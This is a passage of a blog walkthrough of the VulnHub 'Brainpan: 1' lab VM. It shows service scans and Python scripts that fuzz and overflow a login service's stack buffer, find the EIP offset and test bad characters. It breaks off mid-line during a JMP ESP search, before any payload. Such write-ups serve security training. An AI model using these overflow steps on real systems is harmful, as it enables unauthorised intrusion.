---
layout: post
title:  "Brainpan: 1"
date:   2019-04-15 00:34:01 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub]
---
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:56:10 +0000" name="updated"/><title>Brainpan: 1</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/brainpan-1,51/" target="_blank">https://www.vulnhub.com/entry/brainpan-1,51/</a></div><div>Hostname: brainpan</div><div>IP Address: 10.183.0.203</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.203.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# nmap -Pn -sT -sV -sC -A -oA brainpan -p 1-65535 10.183.0.203</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 23:23 EDT</div><div>Nmap scan report for brainpan.homenet.dom (10.183.0.203)</div><div>Host is up (0.0028s latency).</div><div>Not shown: 65533 closed ports</div><div>PORT      STATE SERVICE VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">9999/tcp  open  abyss?</font></div><div>| fingerprint-strings:</div><div>|   NULL:</div><div>|     _| _|</div><div>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</div><div>|     _|_| _| _| _| _| _| _| _| _| _| _| _|</div><div>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</div><div>|     [________________________ WELCOME TO BRAINPAN _________________________]</div><div>|_    ENTER THE PASSWORD</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</font></div><div>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</div><div>SF-Port9999-TCP:V=7.70%I=7%D=4/22%Time=5CBE8521%P=x86_64-pc-linux-gnu%r(NU</div><div>SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div><div>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20</div><div>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</div><div>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</div><div>SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|</div><div>SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\</div><div>SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x</div><div>SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</div><div>SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</div><div>SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|</div><div>SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</div><div>SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</div><div>SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x</div><div>SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_</div><div>SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x</div><div>SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20</div><div>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</div><div>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</div><div>SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</div><div>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2</div><div>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</div><div>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</div><div>SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x</div><div>SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div><div>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x</div><div>SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</div><div>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\</div><div>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div><div>SF:\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");</div><div>MAC Address: 08:00:27:06:7A:58 (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 2.6.X|3.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div><div>OS details: Linux 2.6.32 - 3.10</div><div>Network Distance: 1 hop</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   2.80 ms brainpan.homenet.dom (10.183.0.203)</div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 47.07 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>The service available on TCP port 9999 is returning lots of hex characters. Let's use netcat to capture the information being sent and see what we've got.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# nc 10.183.0.203 9999 &gt; tcp9999.bin</div><div>^C</div><div>root@kali:~/Walkthroughs/brainpan# vim tcp9999.bin</div><div>_|                            _|</div><div>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|</div><div>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</div><div>                                            _|</div><div>                                            _|</div><div><div><br/></div></div><div>[________________________ WELCOME TO BRAINPAN _________________________]</div><div>                          ENTER THE PASSWORD</div><div><div><br/></div></div><div>                          &gt;&gt;</div></div><div><br/></div><div>Looks like we have a non-standard login interface. We obviously don't have the password for this (yet?), so we'll have to come back to it.</div><div><br/></div><div>There is a python SimpleHTTP service listening on TCP port 10000.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# nikto -h http://10.183.0.203:10000</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.203</div><div>+ Target Hostname:    10.183.0.203</div><div>+ Target Port:        10000</div><div>+ Start Time:         2019-04-23 00:01:04 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">SimpleHTTP/0.6 Python/2.7.3</font></div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ Python/2.7.3 appears to be outdated (current is at least 2.7.8)</div><div>+ SimpleHTTP/0.6 appears to be outdated (current is at least 1.2)</div><div>+ OSVDB-3268: /bin/: Directory indexing found.</div><div>+ OSVDB-3092: /bin/: This might be interesting...</div><div>+ ERROR: Error limit (20) reached for host, giving up. Last error: invalid HTTP response</div><div>+ Scan terminated:  20 error(s) and 7 item(s) reported on remote host</div><div>+ End Time:           2019-04-23 00:01:35 (GMT-4) (31 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>The versions of Python and SimpleHTTP identified don't have known exploits in the exploit database.</div><div><br/></div><div>The /bin directory only contains a single EXE file.</div><div><br/></div><div><img height="113" src="/assets/images/2019-04-15-brainpan-1/46F63A17-4B67-48DB-95EA-3126F08026F4.png" width="275"/><br/></div><div><br/></div><div>Let's download the EXE and dig into it to see if we can find anything useful.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# wget http://10.183.0.203:10000/bin/brainpan.exe</div><div>root@kali:~/Walkthroughs/brainpan# strings brainpan.exe &gt; brainpan.exe.strings</div><div>root@kali:~/Walkthroughs/brainpan# vim brainpan.exe.strings</div></div><div><br/></div><div>Looking through the strings, this EXE appears to be the same one running on TCP port 9999. We also see a potential password "sh**storm" (** added by me for the obvious reasons).</div><div><br/></div><div>I try connecting to the service on TCP port 9999 using netcat and passing it the password.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# nc -v 10.183.0.203 9999</div><div>brainpan.homenet.dom [10.183.0.203] 9999 (?) open</div><div>_|                            _|                                        </div><div>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </div><div>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</div><div>                                            _|                          </div><div>                                            _|</div><div><div><br/></div></div><div>[________________________ WELCOME TO BRAINPAN _________________________]</div><div>                          ENTER THE PASSWORD                              </div><div><div><br/></div></div><div>                          &gt;&gt; sh**storm</div><div>                          ACCESS GRANTED</div></div><div><br/></div><div>The message returned is "ACCESS GRANTED", but then I just get disconnected. So, that seems worthless.</div><div><br/></div><div>So, we have a non-standard login service on TCP port 9999. We have the service's EXE available on TCP port 10000. The login service accepts user input, but doesn't seem to do anything with it (wether you login "correctly" or not). I guess the next thing to try is to crash the service and see if we might have a buffer overflow to exploit.</div><div><br/></div><div>To do this, we'll start by creating a simple python script to send more and more 'A's until we crash the service. This will give us an idea about how much data it takes to overflow the register. Also, since we have the EXE we want to test, we'll run it and debug it on a Windows machine (10.183.0.187) rather than crashing the service on our target.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat fuzz.py </div><div>#!/usr/bin/python</div><div>import socket</div><div><div><br/></div></div><div># create an array of buffers (31), from 1,100,200...3000 (increments of 100).</div><div>buffer=["A"]</div><div>counter=100</div><div>while len(buffer) &lt;= 30:</div><div>  buffer.append("A"*counter)</div><div>  counter=counter+100</div><div><div><br/></div></div><div># start sending each buffer to see if/when the service crashes</div><div>for string in buffer:</div><div>  try:</div><div>    print "Fuzzing with %s bytes" % len(string)</div><div>    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>    s.settimeout(2)</div><div>    s.connect(('10.183.0.187',9999))</div><div>    s.recv(1024)</div><div>    s.send(string + '\n')</div><div>    s.close()</div><div>  except:</div><div>    print "Could not connect to TCP port 9999"</div><div>    break</div></div><div><br/></div><div>We will start brainpan.exe on our Windows machine...</div><div><br/></div><div><img height="350" src="/assets/images/2019-04-15-brainpan-1/05454860-3C7E-4B3D-BE09-3B35E115C2F9.png" width="687"/><br/></div><div><br/></div><div>Then start Immunity Debugger and File -&gt; Attach to the brainpan.exe</div><div><br/></div><div><img height="268" src="/assets/images/2019-04-15-brainpan-1/38EBE7F5-8E2C-446C-9AA7-12EDFAA7D27A.png" width="555"/><br/></div><div><br/></div><div>Once attached, we'll hit F9 in Immunity Debugger to go from Paused to Running.</div><div><br/></div><div>Now, we can return to our attacking machine and run our fuzzer.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# python fuzz.py </div><div>Fuzzing with 1 bytes</div><div>Fuzzing with 100 bytes</div><div>Fuzzing with 200 bytes</div><div>Fuzzing with 300 bytes</div><div>Fuzzing with 400 bytes</div><div>Fuzzing with 500 bytes</div><div>Fuzzing with 600 bytes</div><div>Fuzzing with 700 bytes</div><div>Could not connect to TCP port 9999</div></div><div><br/></div><div>When we run our script, we see that things die at around 700 bytes. Actually, we crashed the service at 600 bytes, then failed to connect when we started our loop to send 700 bytes. Checking our debugger, we see we were able to overflow the EIP (Extended Instruction Pointer) with As (\x41). Controlling the EIP is key in an overflow attack.</div><div><br/></div><div><img height="156" src="/assets/images/2019-04-15-brainpan-1/BC0AA602-A93D-45D4-A0EE-75E2C56F8079.png" width="305"/><br/></div><div><br/></div><div>Knowing this, we can create a unique string to send to the program and find out exactly how many As to send before setting the EIP. To do this, we use the <a href="https://github.com/corelan/mona" target="_blank">mona module</a> inside Immunity Debugger. We'll create a unique string of 650 characters (since we know the crash happened at around 600).</div><div><br/></div><div>In the command bar at the bottom of Immunity Debugger, we enter</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona pc 650</div></div><div><br/></div><div><img height="223" src="/assets/images/2019-04-15-brainpan-1/2D8F1E50-5C70-4A46-9796-0CDFC72E5F96.png" width="1170"/><br/></div><div><br/></div><div>Now, we'll take the unique string generated by mona and use it in our python script (instead of As).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat overflow.py </div><div>#!/usr/bin/python</div><div>import socket</div><div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div><div><br/></div></div><div>buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av"</div><div><div><br/></div></div><div>try:</div><div>  print "Sending evil buffer..."</div><div>  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>  s.settimeout(2)</div><div>  s.connect(('10.183.0.187',9999))</div><div>  s.recv(1024)</div><div>  s.send(buffer + '\n')</div><div>  print "Done!"</div><div>except:</div><div>  print "Could not connect to TCP port 9999"</div></div><div><br/></div><div>We'll restart brainpan.exe and Immunity Debugger on our Windows machine then re-attach and press F9. Now, let's send our unique string.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# python overflow.py </div><div>Sending evil buffer...</div><div>Done!</div></div><div><br/></div><div>Nothing fancy in the output here. Let's check the debugger.</div><div><br/></div><div><img height="563" src="/assets/images/2019-04-15-brainpan-1/FC4E8327-7FE3-4663-9251-6764359DD0EB.png" width="317"/><br/></div><div><br/></div><div>The EIP now has a string of 35724134 (hex). Looking down in our memory dump, we see that corresponds to "4Ar5" (ascii). Let's use mona to see how many bytes into our unique string "4Ar5" occurs.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona po 4Ar5</div></div><div><br/></div><div><img height="195" src="/assets/images/2019-04-15-brainpan-1/FD612550-6447-434B-B5E5-DA96C6614088.png" width="549"/><br/></div><div><br/></div><div>Mona tells us the string occurs at position 524. Now we know we need to use 524 As to overflow into the EIP. Let's test that. This time we'll send 524 As, then 4 Bs (which should fit perfectly into our EIP, then 500 Cs and a single D. We are going to send 500 Cs to see if we can overflow enough space for the exploit we want to send later (which will take about 300-400 bytes). We are putting the single D on the end to make sure all 500 Cs made it (without having to count).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat overflow2.py </div><div>#!/usr/bin/python</div><div>import socket</div><div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div><div><br/></div></div><div>buffer = "A"*524 + "B"*4 + "C"*500 + "D"</div><div><div><br/></div></div><div>try:</div><div>  print "Sending evil buffer..."</div><div>  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>  s.settimeout(2)</div><div>  s.connect(('10.183.0.187',9999))</div><div>  s.recv(1024)</div><div>  s.send(buffer + '\n')</div><div>  print "Done!"</div><div>except:</div><div>  print "Could not connect to TCP port 9999"</div></div><div><br/></div><div>We'll restart brainpan.exe and Immunity Debugger on our Windows machine then re-attach and press F9. Now, let's send our updated buffer and check the registers.</div><div><br/></div><div><img height="621" src="/assets/images/2019-04-15-brainpan-1/C80BAC93-82FD-4C44-9334-D51C5C08CF98.png" width="312"/><br/></div><div><br/></div><div>Nice! We overflowed with As (\x41) right up to our EIP, filled the EIP with Bs (\x42) and then carved out space for our exploit with Cs (\x43) in the ESP (stack pointer). Scrolling down in our memory stack, we don't see our final D. Our Cs start at memory address 0028F930 and end at address 0028FB08. Doing some hex math (FB08 - F930), that means we have 472 bytes to work with. That should still be enough for our exploit code, but we are cutting it close.</div><div><br/></div><div>Now that we know the format of what we want to send, we need to do a couple more things. 1) We need to know if there are any bad characters our exploit code shouldn't use and 2) we need to know if there is a JMP ESP command we can use for our EIP (rather than trying to hard code a memory address).</div><div><br/></div><div>Let's start by identifying any bad characters. Again, we'll use mona to generate a byte array of all the possible bad characters. We'll then send the list in place of the Cs and see if any fail to fill the stack.</div><div><br/></div><div>The mona command we'll use to build our byte array is...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona bytearray -b '\x00'</div></div><div><br/></div><div>We went ahead and excluded the notoriously bad null character (\x00).</div><div><br/></div><div><img height="336" src="/assets/images/2019-04-15-brainpan-1/7EF39D59-01F2-41CB-AE04-7C90A2C8E522.png" width="1163"/><br/></div><div><br/></div><div>We can pull the byte array from the C:\Logs\brainpan\bytearray.txt file mona created and use it in our python script.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat overflow3.py </div><div>#!/usr/bin/python</div><div>import socket</div><div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div><div><br/></div></div><div>badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</div><div>"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</div><div>"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</div><div>"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</div><div>"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</div><div>"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</div><div>"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</div><div>"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")</div><div><div><br/></div></div><div>buffer = "A"*524 + "B"*4 + badchars</div><div><div><br/></div></div><div>try:</div><div>  print "Sending evil buffer..."</div><div>  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>  s.settimeout(2)</div><div>  s.connect(('10.183.0.187',9999))</div><div>  s.recv(1024)</div><div>  s.send(buffer + '\n')</div><div>  print "Done!"</div><div>except:</div><div>  print "Could not connect to TCP port 9999"</div></div><div><br/></div><div>We'll restart brainpan.exe and Immunity Debugger on our Windows machine then re-attach and press F9. Now, let's send the bad chars and check the registers.</div><div><br/></div><div><img height="657" src="/assets/images/2019-04-15-brainpan-1/4B535411-0D86-4FB4-954C-020A8F08A19D.png" width="317"/><br/></div><div><br/></div><div>We'll use mona to help us check to see that all the bad chars made it to the stack. To do this, we need take note of the ESP address (0028F930). Now, we'll run the following mona command.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona compare -f C:\Logs\brainpan\bytearray.bin -a 0028F930</div></div><div><br/></div><div><img height="581" src="/assets/images/2019-04-15-brainpan-1/AABE959B-3B7A-4D30-9F93-F03B271AAC7E.png" width="1273"/><br/></div><div><br/></div><div>Mona tells us the byte array is unmodified in the stack, so all the "bad" characters made it through. That will give us more flexibility when encoding our payload with msfvenom later.</div><div><br/></div><div>The last thing we need to do is see if our application (or one of its associated libraries) have a non-ASLR or DEP protected module we can use to jump to the ESP. Again, mona can help us identify the modules available.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona modules</div></div><div><br/></div><div><img height="571" src="/assets/images/2019-04-15-brainpan-1/7DE31177-D1F7-4264-A9CB-E32A4E9D66C7.png" width="1150"/><br/></div><div><br/></div><div>Looks like our only option is going to be the brainpan.exe itself. There are two ways we can search for the location of JMP ESP in the brainpan.exe.</div><div><br/></div><div>1) Use objdump</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# objdump -D brainpan.exe | grep -i jmp | grep -i esp</div><div>311712f3:       ff e4                   jmp    